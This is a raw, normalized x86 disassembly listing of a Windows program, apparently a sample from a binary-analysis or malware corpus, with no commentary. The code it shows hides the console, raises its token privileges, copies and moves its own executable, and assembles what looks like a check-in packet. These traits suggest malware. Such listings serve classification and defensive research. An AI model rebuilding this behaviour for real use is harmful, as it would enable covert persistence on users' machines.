push eax
call sub_4014e7
call [ FreeConsole@IAT ]
push 0x8007
call [ SetErrorMode@IAT ]
push sub_413388
call [ SetUnhandledExceptionFilter@IAT ]
call sub_413925
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58b4 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x280 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x504 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x508 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x78c ] 0x0
push 0x64
mov eax [ ebp - 0x4 ]
add eax 0x790
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0x874 ] 0x0
mov eax [ ebp - 0x4 ]
or [ eax + 0x58bc ] 0xffffffff
mov eax [ ebp - 0x4 ]
or [ eax + 0x58c0 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58cc ] 0x1
mov eax [ ebp - 0x4 ]
or [ eax + 0x58b8 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58c4 ] 0x0
call sub_4137bf
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x5768 ] eax
call sub_4137bf
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x576c ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x58ac ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x58b0 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x577c ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x58a0 ] 0x0
push 0x8
mov eax [ ebp - 0x4 ]
add eax 0x58a4
push eax
call sub_40103d
pop ecx
pop ecx
push 0x120
mov eax [ ebp - 0x4 ]
add eax 0x5780
push eax
call sub_40103d
pop ecx
pop ecx
push 0x880
mov eax [ ebp - 0x4 ]
add eax 0x4e80
push eax
call sub_40103d
pop ecx
pop ecx
mov edx [ ebp - 0x4 ]
add edx 0x5730
mov ecx [ ebp - 0x4 ]
call sub_410cfd
mov edx [ ebp - 0x4 ]
add edx 0x5748
mov ecx [ ebp - 0x4 ]
call sub_410cfd
mov eax [ ebp - 0x4 ]
or [ eax + 0x5764 ] 0xffffffff
mov edx [ ebp - 0x4 ]
add edx 0x5718
mov ecx [ ebp - 0x4 ]
call sub_410cfd
push r--data
mov edx r--data
mov ecx [ ebp - 0x4 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp - 0x4 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp - 0x4 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp - 0x4 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp - 0x4 ]
call sub_413f1a
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
leave
retn
sub_414299
push ebp
mov ebp esp
push 0xffffffff
push sub_4238c1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ rw-data ]
or eax 0x1
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
call sub_414062
push sub_4242f1
call sub_402b39
pop ecx
or [ ebp - 0x4 ] 0xffffffff
sub_4142f6
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x78c ] 0x0
jg r-xdata
and [ ebp - 0xc ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x78c ]
jge r-xdata
leave
retn
mov al 0x1
mov eax [ ebp - 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0x10 ]
mov [ eax + rw-data ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0xc ]
mov [ eax + rw-data ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0xc
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
imul eax eax 0xc
add eax rw-data
push eax
push sub_413935
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
imul eax eax 0x14
mov ecx [ ebp - 0x10 ]
movzx eax [ ecx + eax + 0x518 ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
imul eax eax 0x14
mov ecx [ ebp - 0xc ]
imul ecx ecx 0xc
mov edx [ ebp - 0x10 ]
mov eax [ edx + eax + 0x51c ]
add eax [ ecx + rw-data ]
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x14
mov edx [ ebp - 0x10 ]
mov [ edx + ecx + 0x51c ] eax
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
push 0xffffffff
push [ ebp - 0x8 ]
call [ WaitForSingleObject@IAT ]
push 0xc8
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
sub_4143fc
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
cmp ecx [ eax + 0x2b78 ]
jge r-xdata
mov al 0x1
leave
retn
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push sub_4139b4
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
push 0xffffffff
push [ ebp - 0x8 ]
call [ WaitForSingleObject@IAT ]
mov eax [ ebp - 0x1c ]
imul eax eax 0x118
mov ecx [ ebp - 0x20 ]
mov eax [ ecx + eax + 0x988 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
imul ecx ecx 0x118
mov edx [ ebp - 0x20 ]
mov [ edx + ecx + 0x988 ] eax
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
push 0xc8
call [ Sleep@IAT ]
jmp r-xdata
sub_4144b0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
and [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x4e7c ]
jge r-xdata
mov al 0x1
leave
retn
mov eax [ ebp - 0xc ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
shl ecx 0x4
mov edx [ ebp - 0x10 ]
mov eax [ edx + eax + 0x2b7c ]
mov [ ecx + rw-data ] eax
mov eax [ ebp - 0xc ]
shl eax 0x4
mov ecx [ ebp - 0x10 ]
mov [ eax + rw-data ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0x118
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax + 0x2c8c ]
mov ecx [ ebp - 0xc ]
shl ecx 0x4
mov [ ecx + rw-data ] eax
mov eax [ ebp - 0xc ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
shl ecx 0x4
mov edx [ ebp - 0x10 ]
mov al [ edx + eax + 0x2c90 ]
mov [ ecx + rw-data ] al
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
shl eax 0x4
add eax rw-data
push eax
push sub_413a96
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
push 0x1f4
call [ Sleep@IAT ]
jmp r-xdata
sub_414598
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
call sub_41a144
cmp eax 0x3
jl r-xdata
xor al al
lea eax [ ebp - 0xc ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
leave
retn
sub_4145dc
push ebp
mov ebp esp
push 0xffffffff
push sub_4238e5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x40 ] ecx
lea ecx [ ebp - 0x28 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x17 ] 0x0
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x14 ] 0x0
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x31 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x31 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x1
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
and [ ebp - 0x2c ] 0x0
jmp r-xdata
mov [ ebp - 0x32 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x32 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
lea eax [ eax + eax + 0x2 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4105e1
mov eax [ ebp + 0x8 ]
inc eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_40100f
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x44 ]
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x44 ]
add eax [ ebp - 0x2c ]
movzx eax [ eax ]
cmp eax 0x20
jge r-xdata
mov [ ebp + 0xc ] 0x1
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
mov eax [ ebp - 0x44 ]
add eax [ ebp - 0x2c ]
movzx eax [ eax ]
cmp eax 0xfd
jle r-xdata
mov eax [ ebp - 0x44 ]
add eax [ ebp - 0x2c ]
movzx eax [ eax ]
test eax eax
jne r-xdata
mov al [ ebp + 0xc ]
mov [ ebp - 0x39 ] al
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x39 ]
and [ ebp - 0x30 ] 0x0
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x1
jle r-xdata
mov [ ebp - 0x33 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x33 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec eax
cmp [ ebp - 0x2c ] eax
jge r-xdata
jmp r-xdata
movzx eax [ ebp - 0x18 ]
movzx ecx [ ebp - 0x14 ]
cmp eax ecx
jne r-xdata
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x34 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
movzx eax [ ebp - 0x18 ]
cmp eax 0x35
jl r-xdata
mov al [ ebp - 0x15 ]
mov [ ebp - 0x14 ] al
mov al [ ebp - 0x16 ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x17 ]
mov [ ebp - 0x16 ] al
mov al [ ebp - 0x18 ]
mov [ ebp - 0x17 ] al
mov eax [ ebp - 0x44 ]
add eax [ ebp - 0x2c ]
mov al [ eax ]
mov [ ebp - 0x18 ] al
movzx eax [ ebp - 0x18 ]
movzx ecx [ ebp - 0x16 ]
cmp eax ecx
jne r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x4e
jl r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x4a
jg r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0xad
jl r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x9e
jg r-xdata
mov [ ebp - 0x35 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x35 ]
jmp r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0xe0
jl r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0xd6
jg r-xdata
mov [ ebp - 0x36 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x36 ]
jmp r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0xf8
jg r-xdata
mov [ ebp - 0x37 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x37 ]
jmp r-xdata
mov [ ebp - 0x38 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_4010a3
mov al [ ebp - 0x38 ]
jmp r-xdata
sub_414855
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
leave
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
call sub_4145dc
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax + 0x10 ]
mov ecx [ ebp - 0xc ]
call sub_417318
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_417318
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
inc eax
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
call sub_402b50
add esp 0xc
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_417232
and [ ebp - 0x8 ] 0x0
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
and [ ecx + eax * 2 ] 0x0
sub_41491d
push ebp
mov ebp esp
push 0xffffffff
push sub_423980
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x26c
mov [ ebp - 0x278 ] ecx
and [ ebp - 0x230 ] 0x0
and [ ebp - 0x268 ] 0x0
lea ecx [ ebp - 0x260 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x240 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1d ] 0x0
push 0x1
push 0x1
lea eax [ ebp - 0x268 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x270 ]
push eax
mov edx 0xff00aaee
mov ecx [ ebp - 0x278 ]
call sub_417901
movzx eax al
test eax eax
je r-xdata
mov al [ ebp - 0x1d ]
mov [ ebp - 0x272 ] al
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x240 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x260 ]
call sub_416bd2
mov al [ ebp - 0x272 ]
cmp [ ebp - 0x230 ] 0x0
je r-xdata
mov [ ebp - 0x271 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x240 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x260 ]
call sub_416bd2
mov al [ ebp - 0x271 ]
jmp r-xdata
cmp [ ebp - 0x268 ] 0x0
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push 0x0
push [ ebp - 0x268 ]
lea ecx [ ebp - 0x240 ]
call sub_4105e1
push 0x0
push [ ebp - 0x268 ]
push [ ebp - 0x230 ]
lea ecx [ ebp - 0x240 ]
call sub_410811
lea eax [ ebp - 0x240 ]
push eax
lea ecx [ ebp - 0x260 ]
call sub_416d22
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push 0x5a72b99
lea ecx [ ebp - 0x260 ]
call sub_416ccc
lea ecx [ ebp - 0x1c ]
call sub_401000
test eax eax
jle r-xdata
mov edx [ ebp - 0x230 ]
mov ecx [ ebp - 0x278 ]
call sub_417232
and [ ebp - 0x230 ] 0x0
push 0x3
lea edx [ ebp - 0x22c ]
mov ecx [ ebp - 0x278 ]
call sub_413bfd
push r--data
lea eax [ ebp - 0x22c ]
push eax
call [ lstrcatW@IAT ]
lea edx [ ebp - 0x22c ]
mov ecx [ ebp - 0x278 ]
call sub_411c67
mov [ ebp - 0x264 ] eax
cmp [ ebp - 0x264 ] 0x0
je r-xdata
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
push eax
mov edx [ ebp - 0x264 ]
mov ecx [ ebp - 0x278 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x278 ]
call sub_415c32
push eax
lea eax [ ebp - 0x22c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x22c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x22c ]
push eax
mov ecx [ ebp - 0x278 ]
call sub_415c32
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push 0x1
push r--data
push [ ebp - 0x264 ]
xor edx edx
mov ecx [ ebp - 0x278 ]
call sub_4120dc
mov [ ebp - 0x26c ] eax
cmp [ ebp - 0x26c ] 0x0
je r-xdata
mov edx [ ebp - 0x264 ]
mov ecx [ ebp - 0x278 ]
call sub_417232
push 0x0
mov ecx [ ebp - 0x278 ]
call sub_415c32
push eax
push [ ebp - 0x264 ]
call [ CopyFileW@IAT ]
lea edx [ ebp - 0x22c ]
mov ecx [ ebp - 0x278 ]
call sub_415c5b
push 0x0
push 0x0
mov edx [ ebp - 0x26c ]
mov ecx [ ebp - 0x278 ]
call sub_4137e7
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x26c ]
mov ecx [ ebp - 0x278 ]
call sub_417232
mov [ ebp - 0x1d ] 0x1
sub_414c13
push ebp
mov ebp esp
push 0xffffffff
push sub_42399a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
mov [ ebp - 0x60 ] ecx
and [ ebp - 0x38 ] 0x0
lea ecx [ ebp - 0x30 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xd ] 0x0
push 0x1
push 0x1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x50 ]
push eax
mov edx 0xff00bb00
mov ecx [ ebp - 0x60 ]
call sub_417901
movzx eax al
test eax eax
je r-xdata
mov al [ ebp - 0xd ]
mov [ ebp - 0x59 ] al
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_416bd2
mov al [ ebp - 0x59 ]
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x51 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_416bd2
mov al [ ebp - 0x51 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x48 ]
call sub_4105e1
push 0x0
push [ ebp - 0x38 ]
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x48 ]
call sub_410811
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416d22
mov [ ebp - 0x58 ] 0x5b61360
push 0x1
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
push r--data
push [ ebp - 0x34 ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0xd ] 0x1
sub_414d2b
push ebp
mov ebp esp
push 0xffffffff
push sub_423a51
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x4c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
and [ ebp - 0x50 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4c ]
call sub_4010a3
mov eax [ ebp - 0x50 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push r--data
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x58 ]
call sub_4134ac
movzx eax al
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x4c ]
call sub_40132c
push 0x0
push r--data
lea ecx [ ebp - 0x4c ]
call sub_40132c
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x1
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
call sub_40132c
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x4c ]
call sub_40132c
push 0x0
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x4c ]
call sub_40132c
jmp r-xdata
jmp r-xdata
push [ ebp + 0xc ]
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x1
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_40132c
push 0x0
push r--data
lea ecx [ ebp - 0x4c ]
call sub_40132c
push 0x0
lea ecx [ ebp - 0x4c ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x58 ]
call sub_413434
mov [ ebp - 0x54 ] eax
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4c ]
call sub_4010a3
mov eax [ ebp - 0x54 ]
sub_414e54
push ebp
mov ebp esp
push 0xffffffff
push sub_423b78
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] ecx
lea ecx [ ebp - 0x1c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x77010101
lea ecx [ ebp - 0x1c ]
call sub_410af3
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push [ ebp + 0xc ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_410af3
call [ GetACP@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_410af3
push 0x3
lea ecx [ ebp - 0x1c ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_410af3
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_410ad8
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
push 0x0
push 0x64
mov ecx [ ebp - 0x24 ]
call sub_413b96
push eax
push 0x0
push 0xff0f8211
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x24 ]
call sub_41578c
movzx eax al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x1f ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x1f ]
jmp r-xdata
mov [ ebp - 0x1e ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x1e ]
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x1d ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x14
sub_414fcb
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x15 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x1
movzx eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x2
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x20 ]
push 0x0
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x14 ]
call [ CloseHandle@IAT ]
mov al 0x1
push 0x0
push 0x0
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push [ ebp - 0x14 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
leave
retn 0x4
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x15 ] 0x1
sub_415054
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x1 ] 0x1
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x10
jge r-xdata
mov al [ ebp - 0x1 ]
leave
retn
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + rw-data ]
cmp eax ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_415094
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] 0x1c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x37
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x24 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x10
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x186a0
jle r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
